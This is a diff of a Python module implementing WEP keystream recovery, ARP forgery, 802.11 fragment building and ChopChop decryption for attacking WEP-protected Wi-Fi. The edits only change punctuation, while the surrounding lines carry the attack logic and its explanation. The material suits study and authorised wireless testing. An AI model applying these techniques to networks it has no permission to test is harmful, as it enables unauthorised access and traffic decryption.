@@ -1,13 +1,13 @@
 """Pure WEP crypto for fragmentation / chopchop (M5/M6).
 
-EVERYTHING HERE IS OFFLINE-TESTABLE — no hardware (tests/dot11/test_wep_crypto.py). The
+EVERYTHING HERE IS OFFLINE-TESTABLE: no hardware (tests/dot11/test_wep_crypto.py). The
 hardware-in-the-loop part (recognizing the AP's relayed frame) lives in
 fragmentation.py / chopchop.py.
 
 WEP per-frame layout of the encrypted body (after the 24/26-byte MAC header):
     IV(3) | KeyID(1) | RC4( plaintext ++ ICV )      where ICV = CRC32(plaintext)
 The MAC header is cleartext; only plaintext++ICV is RC4'd. Forging needs only the *keystream*
-(the IV's RC4 output), never the key — the whole point of frag/chopchop.
+(the IV's RC4 output), never the key: the whole point of frag/chopchop.
 """
 
 from __future__ import annotations
@@ -15,7 +15,7 @@ from __future__ import annotations
 import struct
 import zlib
 
-# LLC/SNAP header — the SAME first 6 bytes prefix EVERY 802.11 data frame
+# LLC/SNAP header: the SAME first 6 bytes prefix EVERY 802.11 data frame
 # regardless of protocol, which is the known-plaintext foothold for the
 # fragmentation seed. The 2-byte ethertype follows (IP 0x0800, ARP 0x0806, …).
 _SNAP_HDR = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
@@ -25,7 +25,7 @@ _ARP_HDR = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])  # eth/ip, re
 
 def icv(plaintext: bytes) -> bytes:
     """4-byte WEP ICV: CRC-32 of plaintext, little-endian. WEP's ICV is the
-    standard IEEE CRC-32 (reflected, init/final 0xFFFFFFFF) — i.e. zlib.crc32."""
+    standard IEEE CRC-32 (reflected, init/final 0xFFFFFFFF), i.e. zlib.crc32."""
     return struct.pack("<I", zlib.crc32(plaintext) & 0xFFFFFFFF)
 
 
@@ -65,7 +65,7 @@ def forge_arp_request(
     Plaintext = LLC/SNAP ++ ARP-request (36 B), so needs >= 40 B of keystream.
     The caller prepends the IV+KeyID this keystream belongs to and a
     ToDS MAC header before injection. target_mac is all-zero
-    (unknown — it's a request)."""
+    (unknown, it's a request)."""
     plaintext = arp_request_plaintext(
         sender_mac=sender_mac, sender_ip=sender_ip, target_ip=target_ip
     )
@@ -76,7 +76,7 @@ def seed_keystream_from_data(
     cipher: bytes, *, want: int = 8, ethertype: int = 0x0800
 ) -> bytes:
     """Recover the first ``want`` bytes of keystream (PRGA) from the leading
-    ciphertext of ANY captured WEP *data* frame — the fragmentation foothold
+    ciphertext of ANY captured WEP *data* frame: the fragmentation foothold
     that makes the attack independent of replayable ARPs.
 
     Every encrypted data frame's plaintext starts with the LLC/SNAP header
@@ -97,7 +97,7 @@ def seed_keystream_from_data(
 
 def seed_keystream_from_arp(arp_body: bytes, *, want: int = 8) -> bytes:
     """Seed from a captured broadcast WEP ARP's full encrypted body (``IV(3) ++
-    KeyID(1) ++ RC4(plaintext ++ ICV)``) — the ARP-specific convenience.
+    KeyID(1) ++ RC4(plaintext ++ ICV)``), the ARP-specific convenience.
     Delegates to :func:`seed_keystream_from_data` with the ARP ethertype.
     Prefer the data variant for the daemon (works off any frame)."""
     return seed_keystream_from_data(arp_body[4:], want=want, ethertype=0x0806)
@@ -116,19 +116,19 @@ def build_fragments(
     max_fragments: int = 16,
 ) -> list[bytes]:
     """Split ``payload`` into ≤``max_fragments`` WEP-encrypted 802.11 fragments,
-    all sharing one ``iv``/``keystream`` (legal — each fragment is its own MPDU
+    all sharing one ``iv``/``keystream`` (legal: each fragment is its own MPDU
     with its own ICV; reusing the IV is exactly what makes a short seed useful).
 
     Each fragment carries up to ``len(keystream) - 4`` plaintext bytes (4 go to
     the per-fragment ICV). The AP reassembles the decrypted fragments into one
     MSDU, re-encrypts under a single FRESH IV, and (for a broadcast DA) relays
-    it — that relayed frame is the attack's prize. Headers: ToDS+Protected,
+    it. That relayed frame is the attack's prize. Headers: ToDS+Protected,
     More-Fragments set on all but the last, fragment number 0..n-1 in the low
     nibble of Sequence-Control.
 
     The 802.11 frame layout (no QoS, 3-address) mirrors arp_replay's builder so
     the AP accepts it from our associated STA. Returns the fragment frames in
-    order. Pure/offline — verified by a simulated-reassembly round-trip test;
+    order. Pure/offline: verified by a simulated-reassembly round-trip test;
     the LIVE question (does the AP actually reassemble + relay) is the probe's.
     """
     if len(iv) != 3:
@@ -165,7 +165,7 @@ def build_fragments(
 # crc32(P) == CRC32_RESIDUE. This is what lets ChopChop cancel the unknown ICV.
 CRC32_RESIDUE = 0x2144DF1C
 
-# CRC-32 table (poly 0xEDB88320, reflected — same CRC as zlib/WEP) + the
+# CRC-32 table (poly 0xEDB88320, reflected, same CRC as zlib/WEP) + the
 # reverse-lookup of table entries by their top byte (a permutation).
 _CRC_TABLE = []
 for _n in range(256):
@@ -236,7 +236,7 @@ def _patch_zeros(zlen: int, target_crc: int) -> bytes:
 def chop_last_byte_and_fixup(body: bytes, plaintext_guess: int) -> bytes:
     """ChopChop core: given an encrypted body whose ICV is valid, return a
     one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess`` equals
-    the true last plaintext byte P[L-1]. No key needed — that's the attack.
+    the true last plaintext byte P[L-1]. No key needed: that's the attack.
 
     Result = body[:-1] with its last 4 bytes XORed by a correction ``corr``
     that depends only on the guess and known quantities. Derivation (affine CRC
